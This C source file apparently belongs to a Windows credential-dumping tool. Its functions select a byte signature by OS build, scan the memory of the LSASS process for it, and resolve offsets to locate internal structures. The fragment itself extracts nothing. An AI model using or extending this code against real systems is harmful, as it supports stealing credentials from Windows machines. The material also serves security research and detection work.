#include "stdafx.h"

BOOL LsaSearchGeneric(PLSA_CONTEXT cLsass, PLSA_LIB pLib, PPATCH_GENERIC genericReferences, SIZE_T cbReferences, PVOID* genericPtr, PVOID* genericPtr1)
{
	BOOL status = FALSE;
	MEMORY_SEARCH sMemory = { {pLib->Informations.DllBase.address, pLib->Informations.SizeOfImage}, NULL };
	PPATCH_GENERIC currentReference;
	LONG offset;
	MEMORY_ADDRESS lsassMemory;

	if (currentReference = GetGenericFromBuild(genericReferences, cbReferences, cLsass->osContext.BuildNumber))
	{
		if (MemorySearch(cLsass->hProcess, currentReference->Search.Pattern, currentReference->Search.Length, &sMemory))
		{
			wprintf(L"[*] Matched signature at 0x%016llx: ", sMemory.result);
			PrintfHex(currentReference->Search.Pattern, currentReference->Search.Length);

			lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off0;
			if (status = ReadProcessMemory(cLsass->hProcess, lsassMemory.address, &offset, sizeof(LONG), NULL))
			{
				*genericPtr = ((PBYTE)lsassMemory.address + sizeof(LONG) + offset);
			}

			if (genericPtr1)
			{
				lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off1;
				if (status = ReadProcessMemory(cLsass->hProcess, lsassMemory.address, &offset, sizeof(LONG), NULL))
				{
					*genericPtr1 = ((PBYTE)lsassMemory.address + sizeof(LONG) + offset);
				}
			}
		}
	}
	pLib->isInit = status;
	return status;
}


PPATCH_GENERIC GetGenericFromBuild(PPATCH_GENERIC generics, SIZE_T cbGenerics, DWORD BuildNumber)
{
	SIZE_T i;
	PPATCH_GENERIC current = NULL;

	for (i = 0; i < cbGenerics; i++)
	{
		if (generics[i].MinBuildNumber <= BuildNumber)
		{
			current = &generics[i];
		}
		else break;
	}
	return current;
}


void PrintfHex(LPCVOID lpData, DWORD cbData)
{
	for (DWORD i = 0; i < cbData; i++)
	{
		wprintf(L"%02x ", ((LPCBYTE)lpData)[i]);
	}
	wprintf(L"\n");
}